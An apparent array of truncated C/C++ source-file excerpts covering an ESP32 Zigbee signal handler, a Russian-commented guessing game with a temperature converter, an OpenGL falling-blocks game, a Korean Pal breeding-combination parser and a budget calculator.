     log_i(\"Receive Zigbee action(0x%x) callback\", callback_id);\n            break;\n    }\n\n    return ret;\n}\n\n// Handle identify functionality\nvoid onZigbeeIdentify(uint8_t identify_on) {\n    static bool isIdentifying = false;\n    bool wasIdentifying = isIdentifying;\n    isIdentifying = identify_on;\n\n    if (onIdentifyCallback != NULL) {\n        if (isIdentifying && !wasIdentifying) {\n            onIdentifyCallback(true);\n        } else if (!isIdentifying && wasIdentifying) {\n            onIdentifyCallback(false);\n        }\n    }\n}\n\n// Zigbee signal handlers\nstatic void bdb_start_top_level_commissioning_cb(uint8_t mode_mask) {\n    ESP_ERROR_CHECK(esp_zb_bdb_start_top_level_commissioning(mode_mask));\n}\n\nvoid esp_zb_app_signal_handler(esp_zb_app_signal_t *signal_struct) {\n    uint32_t *p_sg_p = signal_struct->p_app_signal;\n    esp_err_t err_status = signal_struct->esp_err_status;\n    esp_zb_app_signal_type_t sig_type = (esp_zb_app_signal_type_t)*p_sg_p;\n\n    switch (sig_type) {\n        case ESP_ZB_ZDO_SIGNAL_SKIP_STARTUP:\n            log_i(\"Zigbee stack initialized\");\n            esp_zb_bdb_start_top_level_commissioning(ESP_ZB_BDB_MODE_INITIALIZATION);\n            break;\n\n        case ESP_ZB_BDB_SIGNAL_DEVICE_FIRST_START:\n        case ESP_ZB_BDB_SIGNAL_DEVICE_REBOOT:\n            if (err_status == ESP_OK) {\n                log_i(\"Start network steering\");\n                log_i(\"Device started up in %sfactory-reset mode\", esp_zb_bdb_is_factory_new() ? \"\" : \"non \");\n\n                // Attach our identify handler\n                esp_zb_identify_notify_handler_register(HA_ESP_SENSOR_ENDPOINT, &onZigbeeIdentify);\n\n                if (esp_zb_bdb_is_factory_new()) {\n                    log_i(\"Start network steering\");\n                    esp_zb_bdb_start_top_level_commissioning(ESP_ZB_BDB_MODE_NETWORK_STEERING);\n                } else {\n                    log_i(\"Device rebooted\");\n\n                    if (onInitCallback != NULL) {\n                        onInitCallback();\n                    }\n                }\n            } else {\n                /* commissioning failed */\n                log_w(\"Failed to initialize Zigbee stack (status: %s)\", esp_err_to_name(err_status));\n\n                // restart after 5 seconds\n                delay(2000);\n                esp_restart();\n            }\n            break;\n\n        case ESP_ZB_BDB_SIGNAL_STEERING:\n            if (err_status == ESP_OK) {\n                esp_zb_ieee_addr_t extended_pan_id;\n                esp_zb_get_extended_pan_id(extended_pan_id);\n                log_i(\n           ",
    "\ufeff#include <iostream>\n#include <cstdlib> // \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 \u0434\u043b\u044f \u0433\u0435\u043d\u0435\u0440\u0430\u0446\u0438\u0439 \u0440\u0430\u043d\u0434\u043e\u043c\u043d\u044b\u0445 \u0447\u0438\u0441\u0435\u043b\n#include <ctime>   // \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u0433\u0435\u043d\u0435\u0440\u0438\u0440\u0443\u0435\u0442 \u0441\u043b\u0443\u0447\u0430\u0439\u043d\u044b\u0435 \u0447\u0438\u0441\u043b\u0430 \u0441 \u0437\u0430\u0434\u0430\u043d\u043d\u044b\u043c \u0432\u0440\u0435\u043c\u0435\u043d\u0435\u043c\n#include <variant> // \u0431\u0438\u0431\u043b\u0438\u043e\u0442\u0435\u043a\u0430 \u0434\u043b\u044f \u043f\u0440\u043e\u0449\u0435\u0433\u043e \u043c\u0430\u0441\u0441\u0438\u0432\u0430\n#include <string>  // \u0414\u043b\u044f \u0440\u0430\u0431\u043e\u0442\u044b \u0441 \u0441\u0442\u0440\u043e\u043a\u0430\u043c\u0438\n#include <SFML/Graphics.hpp> // \u0431\u0438\u0431\u043b\u0438\u0442\u0435\u043a\u0430 \u0434\u043b\u044f \u0432\u044b\u0432\u0435\u0434\u0435\u043d\u0438\u0439 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0439 \u043d\u0430 \u044d\u043a\u0440\u0430\u043d, \u0433\u0440\u0430\u0444\u0438\u043a\u0430\n\nusing namespace std;\nusing namespace sf;\n\nvoid playGame(int max_number) {\n    int Secretnum = rand() % max_number + 1; // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u0435\u043a\u0440\u0435\u0442\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \n    int gues = 0; // \u0432\u0432\u043e\u0434\n    int attempts = 0; // \u0432\u0441\u0435\u0433\u043e \u043f\u043e\u043f\u044b\u0442\u043e\u043a\n    cout << \"\u0423\u0433\u0430\u0434\u0430\u0439 \u0447\u0438\u0441\u043b\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u044f \u0437\u0430\u0433\u0430\u0434\u0430\u043b, 1 \u0438\u0437 \" << max_number << \"!\" << endl;\n\n    while (gues != Secretnum) {\n        cout << \"\u0412\u0430\u0448 \u0432\u0430\u0440\u0438\u0430\u043d\u0442 = \"; // \u0446\u0438\u043a\u043b \u043f\u043e\u043a\u0430 \u043d\u0435 \u0443\u0433\u0430\u0434\u0430\u0435\u0442\n        string input;\n        cin >> input;\n\n        // \u0415\u0441\u043b\u0438 \u0432\u0432\u0435\u0434\u0435\u043d\u043e \"STOP\", \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u0438\u0433\u0440\u0443\n        if (input == \"STOP\") {\n            cout << \"\u0418\u0433\u0440\u0430 \u043e\u043a\u043e\u043d\u0447\u0435\u043d\u0430. \u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f!\" << endl;\n            return; // \u0412\u044b\u0445\u043e\u0434 \u0438\u0437 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n        }\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u0443\u0435\u043c \u0432\u0432\u0435\u0434\u0451\u043d\u043d\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0447\u0438\u0441\u043b\u043e\n        gues = stoi(input);\n        attempts++;\n\n        if (gues > Secretnum) {\n            cout << \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e. \u0422\u0432\u043e\u0451 \u0447\u0438\u0441\u043b\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u043c\u0435\u043d\u044c\u0448\u0435\" << endl;\n        }\n        else if (gues == Secretnum) {\n            cout << \"\u0423\u0413\u0410\u0414\u0410\u0410\u0410\u041b\" << endl;\n        }\n        else if (gues < Secretnum) {\n            cout << \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e. \u0422\u0432\u043e\u0451 \u0447\u0438\u0441\u043b\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u0431\u043e\u043b\u044c\u0448\u0435\" << endl;\n        }\n    }\n}\n\nvoid gameLvl(int max_number) {\n    int Secretnum2 = rand() % max_number + 1; // \u0441\u043e\u0437\u0434\u0430\u043d\u0438\u0435 \u0441\u0435\u043a\u0440\u0435\u0442\u043d\u043e\u0433\u043e \u0447\u0438\u0441\u043b\u0430 \n    int gues2 = 0; // \u0432\u0432\u043e\u0434\n    int attempts2 = 0; // \u0432\u0441\u0435\u0433\u043e \u043f\u043e\u043f\u044b\u0442\u043e\u043a\n    cout << \"\u0423\u0433\u0430\u0434\u0430\u0439 \u0447\u0438\u0441\u043b\u043e \u043a\u043e\u0442\u043e\u0440\u043e\u0435 \u044f \u0437\u0430\u0433\u0430\u0434\u0430\u043b, 1 \u0438\u0437 \" << max_number << \"!\" << endl;\n\n    while (gues2 != Secretnum2) {\n        cout << \"\u0412\u0430\u0448 \u0432\u0430\u0440\u0438\u0430\u043d\u0442 = \"; // \u0446\u0438\u043a\u043b \u043f\u043e\u043a\u0430 \u043d\u0435 \u0443\u0433\u0430\u0434\u0430\u0435\u0442\n        string input;\n        cin >> input;\n\n        // \u0415\u0441\u043b\u0438 \u0432\u0432\u0435\u0434\u0435\u043d\u043e \"STOP\", \u0437\u0430\u0432\u0435\u0440\u0448\u0430\u0435\u043c \u0438\u0433\u0440\u0443\n        if (input == \"STOP\") {\n            cout << \"\u0418\u0433\u0440\u0430 \u043e\u043a\u043e\u043d\u0447\u0435\u043d\u0430. \u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f!\" << endl;\n            return; // \u0412\u044b\u0445\u043e\u0434 \u0438\u0437 \u0444\u0443\u043d\u043a\u0446\u0438\u0438\n        }\n\n        // \u041f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u0443\u0435\u043c \u0432\u0432\u0435\u0434\u0451\u043d\u043d\u0443\u044e \u0441\u0442\u0440\u043e\u043a\u0443 \u0432 \u0447\u0438\u0441\u043b\u043e\n        gues2 = stoi(input);\n        attempts2++;\n\n        if (gues2 > Secretnum2) {\n            cout << \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e. \u0422\u0432\u043e\u0451 \u0447\u0438\u0441\u043b\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u043c\u0435\u043d\u044c\u0448\u0435\" << endl;\n        }\n        else if (gues2 == Secretnum2) {\n            cout << \"\u0423\u0413\u0410\u0414\u0410\u0410\u0410\u041b\" << endl;\n        }\n        else if (gues2 < Secretnum2) {\n            cout << \"\u041d\u0435\u043f\u0440\u0430\u0432\u0438\u043b\u044c\u043d\u043e. \u0422\u0432\u043e\u0451 \u0447\u0438\u0441\u043b\u043e \u0434\u043e\u043b\u0436\u043d\u043e \u0431\u044b\u0442\u044c \u0431\u043e\u043b\u044c\u0448\u0435\" << endl;\n        }\n    }\n}\n\ndouble celsiusToFahrenheit(double celsius) {\n    return (celsius * 9.0 / 5.0) + 32;\n}\n\ndouble CelsiusToKelvin(double celsius) {\n    return celsius + 273.15;\n}\ndouble fahrenheitToCelsius(double fahrenheit) {\n    return (fahrenheit - 32) * 5.0 / 9.0;\n}\n\ndouble fahrenheitToKelvin(double fahrenheit) {\n    return (fahrenheit - 32) * 5.0 / 9.0 + 273.15;\n}\n\ndouble kelvinToCelsius(double kelvin) {\n    return kelvin - 273.15;\n}\n\ndouble kelvinToFahrenheit(double kelvin) {\n    return (kelvin - 273.15) * 9.0 / 5.0 + 32;\n}\n\nint main() {\n    setlocale(LC_ALL, \"Russian\");\n    string input;  // \u0418\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u043c \u0441\u0442\u0440\u043e\u043a\u043e\u0432\u044b\u0439 \u0442\u0438\u043f \u0434\u043b\u044f \u0432\u0432\u043e\u0434\u0430\n    int numLvl = 0;\n    int choice;\n    double value;\n\n    while (true) {\n        cout << \"1 - \u041d\u0430\u0447\u0430\u0442\u044c \u0438\u0433\u0440\u0443\" << endl;\n        cout << \"2 - \u0412\u044b\u0439\u0442\u0438\" << endl;\n        cout << \"3 - \u041a\u043e\u043d\u0432\u0435\u0440\u0442\u0435\u0440 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\" << endl;\n        cout << \"4 - \u0418\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u0435\" << endl;\n        cin >> input;\n\n        if (input == \"4\") {\n            cout << \"\u0412\u044b\u0432\u0435\u0434\u0435\u043d\u0438\u0435 \u0438\u0437\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u043d\u0438\u0435 \u043f\u043e\u043a\u0430 \u0447\u0442\u043e \u0432 \u0440\u0430\u0437\u0440\u0430\u0431\u043e\u0442\u043a\u0435, \u0441\u043f\u0430\u0441\u0438\u0431\u043e \u0437\u0430 \u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435 :) !!!\" << endl;\n        }\n\n        if (input == \"1\") {\n            cout << \"\u0412\u044b\u0431\u0435\u0440\u0438\u0442\u0435 \u0443\u0440\u043e\u0432\u0435\u043d\u044c \u0441\u043b\u043e\u0436\u043d\u043e\u0441\u0442\u0438: \" << endl;\n            cout << \"1. \u041b\u0435\u0433\u043a\u0438\u0439 \u0441 10 \u0438\u0437 1\" << endl;\n            cout << \"2. \u0421\u0440\u0435\u0434\u043d\u0438\u0439 \u0441 50 \u0438\u0437 1\" << endl;\n            cout << \"3. \u0421\u043b\u043e\u0436\u043d\u044b\u0439 \u0441 100 \u0438\u0437 1\" << endl;\n            cin >> numLvl;\n\n            switch (numLvl) {\n            case 1:\n                cout << \"\u041f\u0435\u0440\u0432\u0430\u044f \u0438\u0433\u0440\u0430 \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f\" << endl;\n                playGame(10); // \u041b\u0435\u0433\u043a\u0438\u0439 \u0443\u0440\u043e\u0432\u0435\u043d\u044c\n                break;\n            case 2:\n                cout << \"\u0418\u0433\u0440\u0430 \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0447\u0435\u0440\u0435\u0437 1...2...3!\" << endl;\n                gameLvl(50); // \u0421\u0440\u0435\u0434\u043d\u0438\u0439 \u0443\u0440\u043e\u0432\u0435\u043d\u044c\n                break;\n            case 3:\n                cout << \"\u0418\u0433\u0440\u0430 \u043d\u0430\u0447\u0438\u043d\u0430\u0435\u0442\u0441\u044f \u0447\u0435\u0440\u0435\u0437 1...2...3!\" << endl;\n                gameLvl(100); // \u0421\u043b\u043e\u0436\u043d\u044b\u0439 \u0443\u0440\u043e\u0432\u0435\u043d\u044c\n                break;\n            default:\n                cout << \"\u041d\u0435\u0432\u0435\u0440\u043d\u044b\u0439 \u0432\u044b\u0431\u043e\u0440. \u041f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430.\" << endl;\n                break;\n            }\n        }\n        else if (input == \"2\") {\n            cout << \"\u0418\u0433\u0440\u0430 \u043e\u043a\u043e\u043d\u0447\u0435\u043d\u0430. \u0414\u043e \u0441\u0432\u0438\u0434\u0430\u043d\u0438\u044f!\" << endl;\n            break;\n        }\n        else if (input == \"3\") {\n            cout << \"\u0412\u044b\u0431\u0435\u0440\u0438 \u043a\u0430\u043a \u043a\u043e\u043d\u0432\u0435\u0440\u0442\u0438\u0440\u043e\u0432\u0430\u0442\u044c: \\n\";\n            cout << \"1. \u0426\u0435\u043b\u044c\u0441\u0438\u0439 \u0432 \u0424\u0430\u0440\u0435\u043d\u0433\u0435\u0439\u0442\\n\";\n            cout << \"2. \u0426\u0435\u043b\u044c\u0441\u0438\u0439 \u0432 \u041a\u0435\u043b\u044c\u0432\u0438\u043d\\n\";\n            cout << \"3. \u0424\u0430\u0440\u0435\u043d\u0433\u0435\u0439\u0442 \u0432 \u0426\u0435\u043b\u044c\u0441\u0438\u0439\\n\";\n            cout << \"4. \u0424\u0430\u0440\u0435\u043d\u0433\u0435\u0439\u0442 \u0432 \u041a\u0435\u043b\u044c\u0432\u0438\u043d\\n\";\n            cout << \"5. \u041a\u0435\u043b\u044c\u0432\u0438\u043d \u0432 \u0426\u0435\u043b\u044c\u0441\u0438\u0439\\n\";\n            cout << \"6. \u041a\u0435\u043b\u044c\u0432\u0438\u043d \u0432 \u0424\u0430\u0440\u0435\u043d\u0433\u0435\u0439\u0442\\n\";\n            cout << \"\u0412\u0430\u0448 \u0432\u044b\u0431\u043e\u0440: \";\n            cin >> choice;\n\n            cout << \"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u0437\u043d\u0430\u0447\u0435\u043d\u0438\u0435 \u0442\u0435\u043c\u043f\u0435\u0440\u0430\u0442\u0443\u0440\u044b: \" << endl;\n            c",
    "#include <GL/glut.h>\n#include <iostream>\n#include <cstdlib>\n#include <ctime>\n#include <thread>\n#include <chrono>\n\n// Constants\nconst int GRID_WIDTH = 10;\nconst int GRID_HEIGHT = 20;\nconst int BLOCK_SIZE = 30; // Size of each block in pixels\nconst int SHAPES_COUNT = 4; // M, I, A, S\n\nint score = 0; // Keeps track of the player's score\nbool isGameOver = false; // Flag to indicate if the game is over\n\n// Tetromino definitions (shapes M, I, A, S)\nconst int SHAPES[4][4][4] = {\n    // H Shape\n    {{1, 0, 1}, {1, 1, 1}, {1, 0, 1}},\n    // A Shape\n    {{0, 1, 0}, {1, 1, 1}, {1, 0, 1}},\n    // u Shape\n    {{1, 0, 1}, {1, 0, 1}, {1, 1, 1}},\n    //m shape\n    {{1, 1, 1}, {1, 1, 1}, {1, 0, 1}}\n};\n\n// Colors for each shape\nconst float COLORS[4][3] = {\n    {1.0f, 0.0f, 0.0f}, // Red (M)\n    {0.0f, 1.0f, 0.0f}, // Green (I)\n    {0.0f, 0.0f, 1.0f}, // Blue (A)\n    {1.0f, 0.0f, 1.0f},\n};\n\n// Game state\nint grid[GRID_HEIGHT][GRID_WIDTH] = {0}; // 0: empty, >0: filled with a shape index\nint currentShape[4][4];\nint currentX, currentY;\nint currentShapeIndex;\n\n// Function prototypes\nvoid initGame();\nvoid display();\nvoid timer(int);\nvoid drawGrid();\nvoid drawShape();\nvoid moveShape(int dx, int dy);\nvoid rotateShape(bool clockwise);\nbool isValidPosition();\nvoid lockShape();\nvoid clearLines();\nbool checkGameOver();\nvoid renderScore();\nvoid gameLoop();\n\n// Initialize the game\nvoid initGame() {\n    srand(time(0));\n    currentShapeIndex = rand() % SHAPES_COUNT;\n    std::copy(&SHAPES[currentShapeIndex][0][0], &SHAPES[currentShapeIndex][0][0] + 16, &currentShape[0][0]);\n    currentX = GRID_WIDTH / 2 - 2;\n    currentY = 0;\n}\n\n// Display callback\n// Display callback\nvoid display() {\n    glClear(GL_COLOR_BUFFER_BIT);\n    drawGrid();\n    drawShape();\n    renderScore(); // Render the score\n\n    if (isGameOver) {\n        // Display the Game Over message\n        glColor3f(1.0f, 1.0f, 1.0f); // Red color for the message\n        glRasterPos2f(GRID_WIDTH * BLOCK_SIZE / 4, GRID_HEIGHT * BLOCK_SIZE / 2); // Position for the message\n\n        std::string gameOverText = \"Game Over!\";\n        for (char c : gameOverText) {\n            glutBitmapCharacter(GLUT_BITMAP_HELVETICA_18, c);\n        }\n    }\n\n    glutSwapBuffers();\n}\n\n\n// Draw the grid\nvoid drawGrid() {\n    for (int y = 0; y < GRID_HEIGHT; y++) {\n        for (int x = 0; x < GRID_WIDTH; x++) {\n            if (grid[y][x] > 0) {\n                glColor3f(COLORS[grid[y][x] - 1][0], COLORS[grid[y][x] - 1][1], COLORS[grid[y][x] - 1][2]);\n                glBegin(GL_QUADS);\n                glVertex2f(x * BLOCK_SIZE, y * BLOCK_SIZE);\n                glVertex2f((x + 1) * BLOCK_SIZE, y * BLOCK_SIZE);\n                glVertex2f((x + 1) * BLOCK_SIZE, (y + 1) * BLOCK_SIZE);\n                glVertex2f(x * BLOCK_SIZE, (y + 1) * BLOCK_SIZE);\n                glEnd();\n            }\n        }\n    }\n}\n\n// Draw the current shape\nvoid drawShape() {\n    glColor3f(COLORS[currentShapeIndex][0], COLORS[currentShapeIndex][1], COLORS[currentShapeIndex][2]);\n    for (int y = 0; y < 4; y++) {\n        for (int x = 0; x < 4; x++) {\n            if (currentShape[y][x]) {\n                int screenX = (currentX + x) * BLOCK_SIZE;\n                int screenY = (currentY + y) * BLOCK_SIZE;\n\n                glBegin(GL_QUADS);\n                glVertex2f(screenX, screenY);\n                glVertex2f(screenX + BLOCK_SIZE, screenY);\n                glVertex2f(screenX + BLOCK_SIZE, screenY + BLOCK_SIZE);\n                glVertex2f(screenX, screenY + BLOCK_SIZE);\n                glEnd();\n            }\n        }\n    }\n}\n\n// Timer callback\nvoid timer(int) {\n    if (!isGameOver) {\n        moveShape(0, 1); // Move down\n        glutPostRedisplay();\n        glutTimerFunc(500, timer, 0); // 500 ms for each step\n    }\n}\n\n// Move the shape\nvoid moveShape(int dx, int dy) {\n    currentX += dx;\n    currentY += dy;\n\n    if (!isValidPosition()) {\n        currentX -= dx;\n        currentY -= dy;\n\n        if (dy > 0) { // If moving down fails\n            lockShape();\n            clearLines();\n            if (checkGameOver()) {\n                isGameOver = true;\n            }\n            initGame();\n        }\n    }\n}\n\n\n// Rotate the shape\nvoid rotateShape(bool clockwise) {\n    int rotated[4][4] = {0};\n    for (int y = 0; y < 4; y++) {\n        for (int x = 0; x < 4; x++) {\n            if (clockwise) {\n                rotated[x][3 - y] = currentShape[y][x];\n            } else {\n                rotated[3 - x][y] = currentShape[y][x];\n            }\n        }\n    }\n\n    std::copy(&rotated[0][0], &rotated[0][0] + 16, &currentShape[0][0]);\n\n    if (!isValidPosition()) {\n        std::copy(&SHAPES[currentShapeIndex][0][0], &SHAPES[currentShapeIndex][0][0] + 16, &currentShape[0][0]);\n    }\n}\n\n// Check if the position is valid\nbool isValidPosition() {\n    for (int y = 0; y < 4; y++) {\n        for (int x = 0; x < 4; x++) {\n            if (currentShape[y][x]) {\n                int nx = currentX + x;\n                int ny = currentY + y;\n\n                if (nx < 0 || n",
    "\ufeff//#define TEST\n\n#include <iostream>\n#include <vector>\n#include <fstream>\n#include <queue>\n#include <map>\n#include <list>\n#include \"Queue.hpp\"\n#include \"PalNameConst.hpp\"\n\nusing namespace std;\n\nstatic const int NAME_LEN = 32;\nstatic const wchar_t* DELIMITER = L\"+= \";\nstatic const wchar_t* INPUT_PATH = L\"./\uad50\ubc30\uc2dd.txt\";\nstatic const wchar_t* DUPLICATE_NAME = L\"DUPLICATED\";\nstatic const int MAX_PAL_NUM = 200;\n\nstruct CmpStr\n{\n    bool operator()(const wchar_t* const a, const wchar_t* const b) const\n    {\n        return std::wcscmp(a, b) < 0;\n    }\n};\n\nstruct Comb {\n    const wchar_t* parents[2];\n    const wchar_t* child;    \n};\n\nstruct Node {\n    struct Breed {\n        const wchar_t* spouse;\n        const wchar_t* child;\n    };\n\n    const wchar_t* name;    \n    Breed breeds[MAX_PAL_NUM];\n    int breedNum;\n};\n\nstruct Link {\n    int nodeIdx;\n    int prevLinkIdx;\n    int prevChildIdx;\n    int linkNum;\n};\n\nstruct CmpLink {\n    bool operator()(const pair<int, int>& link1, const pair<int, int>& link2) const\n    {\n        return link1.second > link2.second;\n    }\n};\n\nvoid CopyWithTrim(wchar_t* dst, int dstSize, const wchar_t* src) {    \n    int startSpaceNum = 0;\n    int endSpaceNum = 0;\n\n    int srcLen = wcslen(src);\n    for (int i = 0; i < srcLen; i++) {\n        if (src[i] != L' ') {\n            break;\n        }\n\n        startSpaceNum++;\n    }\n\n    for (int i = srcLen - 1; i >= 0; i--) {\n        if (src[i] != L' ') {\n            break;\n        }\n\n        endSpaceNum++;\n    }\n    \n    wcsncpy_s(dst, dstSize, src + startSpaceNum, srcLen - endSpaceNum);\n}\n\nvoid Trim(wchar_t* src) {\n    int startSpaceNum = 0;\n    int endSpaceNum = 0;\n\n    int srcLen = wcslen(src);\n    for (int i = 0; i < srcLen; i++) {\n        if (src[i] != L' ') {\n            break;\n        }\n\n        startSpaceNum++;\n    }\n\n    for (int i = srcLen - 1; i >= 0; i--) {\n        if (src[i] != L' ') {\n            break;\n        }\n\n        endSpaceNum++;\n    }\n\n    src[srcLen - endSpaceNum] = L'\\0';\n    src = src + startSpaceNum;\n}\n\nwchar_t* TokenizeWCS(wchar_t* str, const wchar_t* delimiter, wchar_t** context) {\n    int delimiterLen = wcslen(delimiter);\n    \n    int delimStartIdx = -1;\n    int delimEndIdx = -1;\n\n    for (int i = 0; str[i] != L'\\0'; i++) {\n        for (int delimIdx = 0; delimIdx < delimiterLen; delimIdx++) {\n            if (str[i] == delimiter[delimIdx]) {\n                delimStartIdx = i;\n                break;\n            }            \n        }\n\n        if (delimStartIdx != -1) {\n            break;\n        }\n    }\n\n    if (delimStartIdx == -1) {\n        *context = nullptr;\n        return str;\n    }\n\n    if (delimStartIdx != -1) {\n        for (int i = delimStartIdx; str[i] != L'\\0'; i++) {\n            bool isDelim = false;\n            for (int delimIdx = 0; delimIdx < delimiterLen; delimIdx++) {\n                if (str[i] == delimiter[delimIdx]) {\n                    isDelim = true;\n                    break;\n                }\n            }\n\n            if (isDelim == false) {\n                delimEndIdx = i - 1;\n                break;\n            }\n        }\n    }\n    \n    str[delimStartIdx] = L'\\0';\n    *context = str + delimEndIdx + 1;\n\n    return str;    \n}\n\nbool IsPalName(const wchar_t* searchName, map<const wchar_t*, int, CmpStr>& palOrderByName) {\n    return palOrderByName.find(searchName) != palOrderByName.end();    \n}\n\nbool ReadFile(vector<Comb>& combs, map<const wchar_t*, int, CmpStr>& palNameIdxByName, const wchar_t* path, const wchar_t** pErrMsg) {\n    wifstream file;\n    file.open(path);\n    if (file.is_open() == false) {\n        *pErrMsg = L\"\uc785\ub825 \ud30c\uc77c\uc744 \ucc3e\uc9c0 \ubabb\ud588\uc2b5\ub2c8\ub2e4.\";        \n        return false;\n    }\n    \n    const int bufferSize = 1024;\n    wchar_t* buffer = new wchar_t[bufferSize];\n    // get combs\n    int combIdx = 0;\n    int lineIdx = 0;\n    bool isAllNameValid = true;\n    while (file.eof() == false) {        \n        file.getline(buffer, bufferSize);\n        lineIdx++;\n        \n        // tokenize input line\n        wchar_t* parents[2]{ nullptr, };\n        wchar_t* child = nullptr;        \n        wchar_t* context = nullptr;\n        parents[0] = TokenizeWCS(buffer, DELIMITER, &context);\n        if (parents[0] == nullptr || context == nullptr) {\n            wcout << lineIdx << \"\uc904\uc5d0 \ud2c0\ub9b0 \ud615\uc2dd\uc73c\ub85c \uc791\uc131\ub418\uc5b4\uc788\uc2b5\ub2c8\ub2e4. \uc774 \uc904\uc740 \ubb34\uc2dc\ub429\ub2c8\ub2e4.\" << endl\n                << \"\ub0b4\uc6a9 : \" << buffer << endl;\n            continue;\n        }\n        parents[1] = TokenizeWCS(context, DELIMITER, &child);\n        if (parents[1] == nullptr || child == nullptr) {\n            wcout << lineIdx << \"\uc904\uc5d0 \ud2c0\ub9b0 \ud615\uc2dd\uc73c\ub85c \uc791\uc131\ub418\uc5b4\uc788\uc2b5\ub2c8\ub2e4. \uc774 \uc904\uc740 \ubb34\uc2dc\ub429\ub2c8\ub2e4.\" << endl\n                << \"\ub0b4\uc6a9 : \" << buffer << endl;\n            continue;\n        }\n\n        // check valid name\n        Trim(parents[0]);\n        Trim(parents[1]);\n        Trim(child);\n\n        const wchar_t* names[3]{ parents[0], parents[1], child };\n        bool isValidNames[3];\n        bool isNameValidInComb = true;\n        for (int i = 0; i < 3; i++) {\n            isValidNames[i] = palNameIdxByName.find(names[i]) != palNameIdxByName.end();\n      ",
    "// budget-calculator.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <vector>\n#include <string>\n#include <nlohmann/json.hpp>\n\nstruct FixCosts\n{\n\tstd::string name;\n\tdouble cost;\n};\n\nvoid addFixCost(std::vector<FixCosts>& fixCosts, std::string name, double cost)\n{\n\tFixCosts fixCost;\n\tfixCost.name = name;\n\tfixCost.cost = cost;\n\tfixCosts.push_back(fixCost);\n}\n\nvoid removeFixCost(std::vector<FixCosts>& fixCosts, std::string name)\n{\n\tfor (int i = 0; i < fixCosts.size(); i++)\n\t{\n\t\tif (fixCosts[i].name == name)\n\t\t{\n\t\t\tfixCosts.erase(fixCosts.begin() + i);\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\nvoid displayFixCosts(std::vector<FixCosts>& fixCosts)\n{\n\tfor (int i = 0; i < fixCosts.size(); i++)\n\t{\n\t\tstd::cout << fixCosts[i].name << \" \" << fixCosts[i].cost << std::endl;\n\t}\n}\n\nvoid editFixCost(std::vector<FixCosts>& fixCosts, std::string name, double cost)\n{\n\tfor (int i = 0; i < fixCosts.size(); i++)\n\t{\n\t\tif (fixCosts[i].name == name)\n\t\t{\n\t\t\tfixCosts[i].cost = cost;\n\t\t\tbreak;\n\t\t}\n\t}\n}\n\ndouble calculateFixCosts(std::vector<FixCosts>& fixCosts)\n{\n\tdouble total = 0;\n\tfor (int i = 0; i < fixCosts.size(); i++)\n\t{\n\t\ttotal += fixCosts[i].cost;\n\t}\n\treturn total;\n}\n\ndouble calculateVar(double income, double expenses)\n{\n\treturn income - expenses;\n}\n\ndouble calculateInvest(double income, double expenses)\n{\n\treturn income - expenses;\n}\n\ndouble calulateSavings(double income, double expenses)\n{\n\treturn income - expenses;\n}\n\ndouble calculatePercentage(double income, int percent)\n{\n\treturn income * percent / 100;\n}\n\nint main() {\n    bool exitProgram = false;\n    std::vector<FixCosts> fixCosts; // Fixkosten au\u00dferhalb der Schleifen deklarieren\n\n    while (!exitProgram) {\n        int mainChoice;\n\n        std::cout << \"--- Welcome to your Budget Calculator ---\\n\";\n        std::cout << \"1. See current data\\n\";\n        std::cout << \"2. Edit your data\\n\";\n        std::cout << \"3. Save your data\\n\";\n        std::cout << \"0. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> mainChoice;\n\n        switch (mainChoice) {\n        case 1: {\n            std::cout << \"Test\\n\"; // Testausgabe, hier sollten deine Daten angezeigt werden\n            break;\n        }\n        case 2: {\n            bool backToMain = false;\n\n            while (!backToMain) {\n                int secChoice;\n\n                std::cout << \"Your current income is: 1000\\n\"; // Variables Einkommen integrieren\n\n                std::cout << \"\\n--- Fix Costs Calculator ---\\n\";\n                std::cout << \"1. Add Fix Costs\\n\";\n                std::cout << \"2. Remove Fix Costs\\n\";\n                std::cout << \"3. Display Fix Costs\\n\";\n                std::cout << \"4. Edit income\\n\"; // Diese Option ist noch nicht implementiert\n                std::cout << \"5. Edit Fix Costs\\n\";\n                std::cout << \"6. Calculate Fix Costs\\n\";\n                std::cout << \"0. Back\\n\";\n                std::cout << \"Enter your choice: \";\n                std::cin >> secChoice;\n\n                switch (secChoice) {\n                case 1: {\n                    std::string name;\n                    double cost;\n                    std::cout << \"Enter the name of the fix cost: \";\n                    